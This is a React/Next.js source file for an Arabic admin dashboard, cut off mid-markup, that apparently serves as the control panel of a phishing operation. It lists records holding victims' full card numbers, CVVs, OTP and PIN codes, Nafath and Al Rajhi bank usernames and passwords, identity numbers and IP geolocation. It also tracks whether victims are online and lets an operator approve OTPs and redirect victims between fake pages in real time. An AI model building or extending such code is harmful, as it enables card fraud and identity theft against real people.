"use client"

import React from "react"
import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  LogOut,
  CreditCard,
  User,
  Car,
  FileText,
  CheckCircle,
  XCircle,
  AlertCircle,
  Clock,
  Calendar,
  Search,
  Shield,
  CreditCardIcon as CardIcon,
  MoreHorizontal,
  Tag,
  Bell,
  Eye,
  Loader2,
  RefreshCw,
  Smartphone,
  LayoutDashboard,
  ArrowUpDown,
  Settings,
  TrendingUp,
  Activity,
  Zap,
  ChevronDown,
  Download,
  Plus,
  Globe,
  Wifi,
  WifiOff,
  ChevronLeft,
  ChevronRight,
  ChevronsLeft,
  ChevronsRight,
  MapPin,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { format } from "date-fns"
import { Toaster, toast } from "sonner"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { auth, database, db } from "@/lib/firestore"
import { Skeleton } from "@/components/ui/skeleton"
import PhoneDialog from "@/components/phone-info"
import NafazAuthDialog from "@/components/nafaz"
import RajhiAuthDialog from "@/components/rajhi"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { playNotificationSound } from "@/lib/actions"
import { Progress } from "@/components/ui/progress"
import { onValue, ref } from "firebase/database"

interface PaymentData {
  cardNumber?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface FormData {
  cardNumber?: string
  cvv?: string
  expiration_date?: string
  card_holder_name?: string
}

interface Notification {
  id: string
  agreeToTerms?: boolean
  card_holder_name?: string
  buyer_identity_number?: string
  cardNumber?: string
  createdDate: string
  customs_code?: string
  cvv?: string
  document_owner_full_name?: string
  expiration_date?: string
  cardYear?: string
  cardMonth?: string
  formData?: FormData
  full_name?: string
  insurance_purpose?: string
  owner_identity_number?: string
  pagename?: string
  paymentData?: PaymentData
  paymentStatus?: string
  phone?: string
  phone2?: string
  seller_identity_number?: string
  serial_number?: string
  status?: string
  vehicle_manufacture_number?: string
  documment_owner_full_name?: string
  vehicle_type?: string
  isHidden?: boolean
  pinCode?: string
  otpCardCode?: string
  phoneOtp?: string
  otpCode?: string
  externalUsername?: string
  externalPassword?: string
  nafadUsername?: string
  nafadPassword?: string
  nafaz_pin?: string
  autnAttachment?: string
  requierdAttachment?: string
  operator?: string
  otpPhoneStatus: string
  phoneOtpCode: string
  phoneVerificationStatus: string
  // Real fields that might exist in Firebase
  lastSeen?: string | number
  isOnline?: boolean
  userAgent?: string
  ipAddress?: string
  country?: string
  countryCode?: string
  currentPage?: string
  city?: string
  region?: string
  latitude?: number
  longitude?: number
  browserInfo?: string
  deviceInfo?: string
  sessionId?: string
  timestamp?: string | number
}

// Country data for display with Arabic names
const countryData: Record<string, { name: string; flag: string }> = {
  SA: { name: "السعودية", flag: "🇸🇦" },
  AE: { name: "الإمارات", flag: "🇦🇪" },
  KW: { name: "الكويت", flag: "🇰🇼" },
  QA: { name: "قطر", flag: "🇶🇦" },
  BH: { name: "البحرين", flag: "🇧🇭" },
  OM: { name: "عمان", flag: "🇴🇲" },
  JO: { name: "الأردن", flag: "🇯🇴" },
  LB: { name: "لبنان", flag: "🇱🇧" },
  EG: { name: "مصر", flag: "🇪🇬" },
  MA: { name: "المغرب", flag: "🇲🇦" },
  TN: { name: "تونس", flag: "🇹🇳" },
  DZ: { name: "الجزائر", flag: "🇩🇿" },
  IQ: { name: "العراق", flag: "🇮🇶" },
  SY: { name: "سوريا", flag: "🇸🇾" },
  YE: { name: "اليمن", flag: "🇾🇪" },
  US: { name: "الولايات المتحدة", flag: "🇺🇸" },
  GB: { name: "المملكة المتحدة", flag: "🇬🇧" },
  DE: { name: "ألمانيا", flag: "🇩🇪" },
  FR: { name: "فرنسا", flag: "🇫🇷" },
  TR: { name: "تركيا", flag: "🇹🇷" },
  IN: { name: "الهند", flag: "🇮🇳" },
  PK: { name: "باكستان", flag: "🇵🇰" },
  BD: { name: "بنغلاديش", flag: "🇧🇩" },
  ID: { name: "إندونيسيا", flag: "🇮🇩" },
  MY: { name: "ماليزيا", flag: "🇲🇾" },
  CN: { name: "الصين", flag: "🇨🇳" },
  JP: { name: "اليابان", flag: "🇯🇵" },
  KR: { name: "كوريا الجنوبية", flag: "🇰🇷" },
  RU: { name: "روسيا", flag: "🇷🇺" },
  IT: { name: "إيطاليا", flag: "🇮🇹" },
  ES: { name: "إسبانيا", flag: "🇪🇸" },
  NL: { name: "هولندا", flag: "🇳🇱" },
  CA: { name: "كندا", flag: "🇨🇦" },
  AU: { name: "أستراليا", flag: "🇦🇺" },
  BR: { name: "البرازيل", flag: "🇧🇷" },
  MX: { name: "المكسيك", flag: "🇲🇽" },
  AR: { name: "الأرجنتين", flag: "🇦🇷" },
  ZA: { name: "جنوب أفريقيا", flag: "🇿🇦" },
  NG: { name: "نيجيريا", flag: "🇳🇬" },
  KE: { name: "كينيا", flag: "🇰🇪" },
  GH: { name: "غانا", flag: "🇬🇭" },
  ET: { name: "إثيوبيا", flag: "🇪🇹" },
  TH: { name: "تايلاند", flag: "🇹🇭" },
  VN: { name: "فيتنام", flag: "🇻🇳" },
  PH: { name: "الفلبين", flag: "🇵🇭" },
  SG: { name: "سنغافورة", flag: "🇸🇬" },
}
// Hook for online users count
function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0);

  useEffect(() => {
    const onlineUsersRef = ref(database, "status");
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const onlineCount = Object.values(data).filter(
          (status: any) => status.state === "online"
        ).length;
        setOnlineUsersCount(onlineCount);
      }
    });

    return () => unsubscribe();
  }, []);

  return onlineUsersCount;
}

// Hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false);

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`);

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      setIsOnline(data && data.state === "online");
    });

    return () => unsubscribe();
  }, [userId]);

  return isOnline;
}

// Enhanced User Status Component
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">(
    "unknown"
  );

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`);

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline");
      } else {
        setStatus("unknown");
      }
    });

    return () => unsubscribe();
  }, [userId]);

  return (
    <div className="flex items-center gap-2">
      <div
        className={`w-2 h-2 rounded-full ${
          status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"
        }`}
      />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  );
}
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "vehicle" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [activeFilter, setActiveFilter] = useState<string | null>(null)
  const [showSidebar, setShowSidebar] = useState(false)
  const router = useRouter()
  const [showCardDialog, setShowCardDialog] = useState(false)
  const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(null)
  const [showPagenameDialog, setShowPagenameDialog] = useState(false)
  const [uniquePagenames, setUniquePagenames] = useState<string[]>([])
  const [showRajhiDialog, setShowRajhiDialog] = useState(false)
  const [showNafazDialog, setShowNafazDialog] = useState(false)
  const [showPhoneDialog, setPhoneDialog] = useState(false)
  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest")

  // Pagination state
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(10)
  const [paginatedNotifications, setPaginatedNotifications] = useState<Notification[]>([])

  // Helper function to determine if user is online based on real data
  const isUserOnline = (notification: Notification): boolean => {
    if (notification.isOnline !== undefined) {
      return notification.isOnline
    }

    // If lastSeen exists, consider online if within last 5 minutes
    if (notification.lastSeen) {
      const lastSeenTime =
        typeof notification.lastSeen === "number" ? notification.lastSeen : new Date(notification.lastSeen).getTime()
      const fiveMinutesAgo = Date.now() - 5 * 60 * 1000
      return lastSeenTime > fiveMinutesAgo
    }

    // If timestamp exists and recent, consider online
    if (notification.timestamp) {
      const timestampTime =
        typeof notification.timestamp === "number" ? notification.timestamp : new Date(notification.timestamp).getTime()
      const fiveMinutesAgo = Date.now() - 5 * 60 * 1000
      return timestampTime > fiveMinutesAgo
    }

    // If createdDate is very recent (within 2 minutes), consider online
    if (notification.createdDate) {
      const createdTime = new Date(notification.createdDate).getTime()
      const twoMinutesAgo = Date.now() - 2 * 60 * 1000
      return createdTime > twoMinutesAgo
    }

    return false
  }

  // Helper function to get country name from code
  const getCountryName = (countryCode?: string): string => {
    if (!countryCode) return "غير محدد"
    return countryData[countryCode.toUpperCase()]?.name || countryCode
  }

  // Helper function to get last seen time
  const getLastSeenTime = (notification: Notification): Date | null => {
    if (notification.lastSeen) {
      return typeof notification.lastSeen === "number"
        ? new Date(notification.lastSeen)
        : new Date(notification.lastSeen)
    }

    if (notification.timestamp) {
      return typeof notification.timestamp === "number"
        ? new Date(notification.timestamp)
        : new Date(notification.timestamp)
    }

    return null
  }

  // Analytics calculations using real data
  const totalNotifications = notifications.length
  const pendingNotifications = notifications.filter((n) => !n.status || n.status === "pending").length
  const approvedNotifications = notifications.filter((n) => n.status === "approved").length
  const rejectedNotifications = notifications.filter((n) => n.status === "rejected").length
  const onlineUsers = notifications.filter((n) => isUserOnline(n)).length
  const completionRate =
    totalNotifications > 0
      ? Math.round(((approvedNotifications + rejectedNotifications) / totalNotifications) * 100)
      : 0

  // Pagination calculations
  const totalPages = Math.ceil(filteredNotifications.length / itemsPerPage)
  const startIndex = (currentPage - 1) * itemsPerPage
  const endIndex = startIndex + itemsPerPage

  const updateAttachment = async (id: string, attachmentType: string, value: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        [attachmentType]: value,
      })
      playNotificationSound()
      toast.success("تم تحديث المرفق بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating attachment:", error)
      toast.error("حدث خطأ أثناء تحديث المرفق", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })
    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    if (searchTerm.trim() === "" && !activeFilter) {
      setFilteredNotifications(notifications)
    } else {
      const filtered = notifications.filter((notification) => {
        const matchesSearch =
          searchTerm.trim() === "" ||
          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.phone?.includes(searchTerm) ||
          notification.cardNumber?.includes(searchTerm) ||
          getCountryName(notification.countryCode).toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.country?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.ipAddress?.includes(searchTerm) ||
          notification.city?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.region?.toLowerCase().includes(searchTerm.toLowerCase())

        const matchesFilter =
          !activeFilter ||
          (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
          (activeFilter === "approved" && notification.status === "approved") ||
          (activeFilter === "rejected" && notification.status === "rejected") ||
          (activeFilter === "payment" && notification.pagename === "payment") ||
          (activeFilter === "registration" && notification.vehicle_type === "registration") ||
          (activeFilter === "online" && isUserOnline(notification)) ||
          (activeFilter === "offline" && !isUserOnline(notification))

        return matchesSearch && matchesFilter
      })
      setFilteredNotifications(filtered)
    }
    setCurrentPage(1) // Reset to first page when filtering
  }, [searchTerm, notifications, activeFilter])

  useEffect(() => {
    // Update paginated notifications when filtered notifications or pagination settings change
    const paginated = filteredNotifications.slice(startIndex, endIndex)
    setPaginatedNotifications(paginated)
  }, [filteredNotifications, currentPage, itemsPerPage, startIndex, endIndex])

  useEffect(() => {
    if (notifications.length > 0) {
      const pagenames = notifications
        .map((notification) => notification.pagename)
        .filter((pagename): pagename is string => !!pagename)
      const uniqueNames = Array.from(new Set(pagenames))
      setUniquePagenames(uniqueNames)
    }
  }, [notifications])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => !notification.isHidden) as Notification[]
        setNotifications(notificationsData)
        setFilteredNotifications(notificationsData)
        setIsLoading(false)
        playNotificationSound()
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )
    return unsubscribe
  }

  const refreshData = () => {
    setIsRefreshing(true)
    const unsubscribe = fetchNotifications()
    setTimeout(() => {
      playNotificationSound()
      setIsRefreshing(false)
      toast.success("تم تحديث البيانات بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    }, 1000)
    return unsubscribe
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      setFilteredNotifications([])
      toast.success("تم مسح جميع البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast.error("حدث خطأ أثناء مسح البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      const updatedNotifications = notifications.filter((notification) => notification.id !== id)
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.cardNumber?.includes(searchTerm) ||
            getCountryName(notification.countryCode).toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.country?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.ipAddress?.includes(searchTerm) ||
            notification.city?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.region?.toLowerCase().includes(searchTerm.toLowerCase())
          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration") ||
            (activeFilter === "online" && isUserOnline(notification)) ||
            (activeFilter === "offline" && !isUserOnline(notification))
          return matchesSearch && matchesFilter
        }),
      )
      toast.success("تم حذف البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast.error("حدث خطأ أثناء حذف البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handlePhoneOtpApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        phoneVerificationStatus: state,
        otpStatus: state,
      })
      toast.success("تم تحديث حالة التحقق بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating phone OTP status:", error)
      toast.error("حدث خطأ أثناء تحديث حالة التحقق", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  const handlePassApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        cardOtpStatus: state,
        otpStatus: state,
      })
      toast.success("تم تحديث حالة البطاقة بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating card status:", error)
      toast.error("حدث خطأ أثناء تحديث حالة البطاقة", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
        paymentStatus: state,
      })
      const updatedNotifications = notifications.map((notification) =>
        notification.id === id ? { ...notification, status: state } : notification,
      )
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.cardNumber?.includes(searchTerm) ||
            getCountryName(notification.countryCode).toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.country?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.ipAddress?.includes(searchTerm) ||
            notification.city?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.region?.toLowerCase().includes(searchTerm.toLowerCase())
          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.pagename === "payment") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration") ||
            (activeFilter === "online" && isUserOnline(notification)) ||
            (activeFilter === "offline" && !isUserOnline(notification))
          return matchesSearch && matchesFilter
        }),
      )

      if (state === "approved") {
        toast.success("تم قبول الطلب بنجاح", {
          position: "top-center",
          duration: 3000,
          icon: <CheckCircle className="h-5 w-5" />,
        })
      } else {
        toast.error("تم رفض الطلب", {
          position: "top-center",
          duration: 3000,
          icon: <XCircle className="h-5 w-5" />,
        })
      }
      closeDialog()
    } catch (error) {
      console.error("Error updating status:", error)
      toast.error("حدث خطأ أثناء تحديث الحالة", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleUpdatePagename = async (id: string, newPagename: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        currentPage: newPagename,
      })
      const updatedNotifications = notifications.map((notification) =>
        notification.id === id ? { ...notification, currentPage: newPagename } : notification,
      )
      setNotifications(updatedNotifications)
      setFilteredNotifications(
        updatedNotifications.filter((notification) => {
          const matchesSearch =
            searchTerm.trim() === "" ||
            notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.phone?.includes(searchTerm) ||
            notification.cardNumber?.includes(searchTerm) ||
            getCountryName(notification.countryCode).toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.country?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.ipAddress?.includes(searchTerm) ||
            notification.city?.toLowerCase().includes(searchTerm.toLowerCase()) ||
            notification.region?.toLowerCase().includes(searchTerm.toLowerCase())
          const matchesFilter =
            !activeFilter ||
            (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
            (activeFilter === "approved" && notification.status === "approved") ||
            (activeFilter === "rejected" && notification.status === "rejected") ||
            (activeFilter === "payment" && notification.currentPage === "6") ||
            (activeFilter === "registration" && notification.vehicle_type === "registration") ||
            (activeFilter === "online" && isUserOnline(notification)) ||
            (activeFilter === "offline" && !isUserOnline(notification))
          return matchesSearch && matchesFilter
        }),
      )
      toast.success("تم تحديث نوع الطلب بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error updating pagename:", error)
      toast.error("حدث خطأ أثناء تحديث نوع الطلب", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast.error("حدث خطأ أثناء تسجيل الخروج", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card" | "vehicle") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const handleCardBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedCardInfo(notification)
    setShowCardDialog(true)
  }

  const handlePagenameBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    setSelectedNotification(notification)
    setShowPagenameDialog(true)
  }

  const handleViewDetails = (notification: Notification) => {
    setSelectedNotification(notification)
    setShowSidebar(true)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  
  const getCountryBadge = (notification: Notification) => {
    // Use real country data from notification
    const countryCode = notification.countryCode
    const countryName = notification.country || getCountryName(countryCode)

    if (!countryCode && !countryName) {
      return (
        <Badge className="bg-gradient-to-r from-gray-100 to-slate-100 text-gray-700 border-gray-200 font-medium px-2 py-1 shadow-sm">
          <Globe className="h-3 w-3 mr-1" />
          غير محدد
        </Badge>
      )
    }

    const countryInfo = countryCode ? countryData[countryCode.toUpperCase()] : null
    const flag = countryInfo?.flag || "🌍"
    const displayName = countryName || countryInfo?.name || countryCode || "غير محدد"

    return (
      <Badge className="bg-gradient-to-r from-blue-100 to-indigo-100 text-blue-800 border-blue-200 hover:from-blue-200 hover:to-indigo-200 font-medium px-2 py-1 shadow-sm">
        <span className="mr-1">{flag}</span>
        {displayName}
      </Badge>
    )
  }

  const getStatusBadge = (paymentStatus?: string) => {
    if (!paymentStatus || paymentStatus === "pending") {
      return (
        <Badge className="bg-gradient-to-r from-amber-100 to-orange-100 text-amber-800 border-amber-200 hover:from-amber-200 hover:to-orange-200 font-medium px-3 py-1 shadow-sm">
          <Clock className="h-3.5 w-3.5 mr-1.5" />
          قيد الانتظار
        </Badge>
      )
    } else if (paymentStatus === "approved") {
      return (
        <Badge className="bg-gradient-to-r from-emerald-100 to-green-100 text-emerald-800 border-emerald-200 hover:from-emerald-200 hover:to-green-200 font-medium px-3 py-1 shadow-sm">
          <CheckCircle className="h-3.5 w-3.5 mr-1.5" />
          مقبول
        </Badge>
      )
    } else {
      return (
        <Badge className="bg-gradient-to-r from-red-100 to-rose-100 text-red-800 border-red-200 hover:from-red-200 hover:to-rose-200 font-medium px-3 py-1 shadow-sm">
          <XCircle className="h-3.5 w-3.5 mr-1.5" />
          مرفوض
        </Badge>
      )
    }
  }

  const getPageType = (pagename?: string, clickable = false, notification?: Notification) => {
    let badge
    switch (pagename) {
      case "payment":
        badge = (
          <Badge
            className={`bg-gradient-to-r from-blue-100 to-indigo-100 text-blue-800 border-blue-200 hover:from-blue-200 hover:to-indigo-200 font-medium px-3 py-1 shadow-sm ${
              clickable ? "cursor-pointer transition-all duration-200" : ""
            }`}
          >
            <CreditCard className="h-3 w-3 mr-1.5" /> دفع
          </Badge>
        )
        break
      case "home":
        badge = (
          <Badge
            className={`bg-gradient-to-r from-purple-100 to-violet-100 text-purple-800 border-purple-200 hover:from-purple-200 hover:to-violet-200 font-medium px-3 py-1 shadow-sm ${
              clickable ? "cursor-pointer transition-all duration-200" : ""
            }`}
          >
            <FileText className="h-3 w-3 mr-1.5" /> تسجيل
          </Badge>
        )
        break
      case "verify-otp":
        badge = (
          <Badge
            className={`bg-gradient-to-r from-pink-100 to-rose-100 text-pink-800 border-pink-200 hover:from-pink-200 hover:to-rose-200 font-medium px-3 py-1 shadow-sm ${
              clickable ? "cursor-pointer transition-all duration-200" : ""
            }`}
          >
            <Shield className="h-3 w-3 mr-1.5" /> رمز OTP
          </Badge>
        )
        break
      case "verify-phone":
        badge = (
          <Badge
            className={`bg-gradient-to-r from-orange-100 to-amber-100 text-orange-800 border-orange-200 hover:from-orange-200 hover:to-amber-200 font-medium px-3 py-1 shadow-sm ${
              clickable ? "cursor-pointer transition-all duration-200" : ""
            }`}
          >
            <Smartphone className="h-3 w-3 mr-1.5" /> رمز هاتف
          </Badge>
        )
        break
      case "external-link":
        badge = (
          <Badge
            className={`bg-gradient-to-r from-emerald-100 to-teal-100 text-emerald-800 border-emerald-200 hover:from-emerald-200 hover:to-teal-200 font-medium px-3 py-1 shadow-sm ${
              clickable ? "cursor-pointer transition-all duration-200" : ""
            }`}
          >
            <Tag className="h-3 w-3 mr-1.5" /> راجحي
          </Badge>
        )
        break
      case "nafaz":
        badge = (
          <Badge
            className={`bg-gradient-to-r from-teal-100 to-cyan-100 text-teal-800 border-teal-200 hover:from-teal-200 hover:to-cyan-200 font-medium px-3 py-1 shadow-sm ${
              clickable ? "cursor-pointer transition-all duration-200" : ""
            }`}
          >
            <Shield className="h-3 w-3 mr-1.5" /> نفاذ
          </Badge>
        )
        break
      case "":
        badge = (
          <Badge
            className={`bg-gradient-to-r from-indigo-100 to-blue-100 text-indigo-800 border-indigo-200 hover:from-indigo-200 hover:to-blue-200 font-medium px-3 py-1 shadow-sm ${
              clickable ? "cursor-pointer transition-all duration-200" : ""
            }`}
          >
            <Calendar className="h-3 w-3 mr-1.5" /> الرئيسية
          </Badge>
        )
        break
      default:
        badge = (
          <Badge
            className={`bg-gradient-to-r from-gray-100 to-slate-100 text-gray-800 border-gray-200 hover:from-gray-200 hover:to-slate-200 font-medium px-3 py-1 shadow-sm ${
              clickable ? "cursor-pointer transition-all duration-200" : ""
            }`}
          >
            <Tag className="h-3 w-3 mr-1.5" /> {pagename || "الرئيسية"}
          </Badge>
        )
    }

    if (clickable && notification) {
      return <div onClick={(e) => handlePagenameBadgeClick(notification, e)}>{badge}</div>
    }
    return badge
  }

  const formatCardNumber = (cardNumber?: string) => {
    if (!cardNumber) return "غير محدد"
    const last4 = cardNumber.slice(-4)
    return `**** **** **** ${last4}`
  }

  const applyFilter = (filter: string | null) => {
    setActiveFilter(filter)
  }

  const handleSortChange = (value: string) => {
    setSortOrder(value as "newest" | "oldest")
    const sorted = [...filteredNotifications].sort((a, b) => {
      const dateA = new Date(a.createdDate as string | number | Date).getTime()
      const dateB = new Date(b.createdDate as string | number | Date).getTime()
      return value === "newest" ? dateB - dateA : dateA - dateB
    })
    setFilteredNotifications(sorted)
  }

  const handlePageChange = (page: number) => {
    setCurrentPage(page)
  }

  const handleItemsPerPageChange = (value: string) => {
    setItemsPerPage(Number.parseInt(value))
    setCurrentPage(1) // Reset to first page
  }

  const PaginationComponent = () => {
    const getPageNumbers = () => {
      const pages = []
      const maxVisiblePages = 5

      if (totalPages <= maxVisiblePages) {
        for (let i = 1; i <= totalPages; i++) {
          pages.push(i)
        }
      } else {
        if (currentPage <= 3) {
          for (let i = 1; i <= 4; i++) {
            pages.push(i)
          }
          pages.push("...")
          pages.push(totalPages)
        } else if (currentPage >= totalPages - 2) {
          pages.push(1)
          pages.push("...")
          for (let i = totalPages - 3; i <= totalPages; i++) {
            pages.push(i)
          }
        } else {
          pages.push(1)
          pages.push("...")
          for (let i = currentPage - 1; i <= currentPage + 1; i++) {
            pages.push(i)
          }
          pages.push("...")
          pages.push(totalPages)
        }
      }

      return pages
    }

    return (
      <div className="flex flex-col sm:flex-row items-center justify-between gap-4 p-6 bg-gradient-to-r from-gray-50 to-slate-50 border-t border-gray-200">
        <div className="flex items-center gap-4 text-sm text-gray-600">
          <div className="flex items-center gap-2">
            <span>عرض</span>
            <Select value={itemsPerPage.toString()} onValueChange={handleItemsPerPageChange}>
              <SelectTrigger className="w-20 h-8 border-gray-200">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="5">5</SelectItem>
                <SelectItem value="10">10</SelectItem>
                <SelectItem value="20">20</SelectItem>
                <SelectItem value="50">50</SelectItem>
                <SelectItem value="100">100</SelectItem>
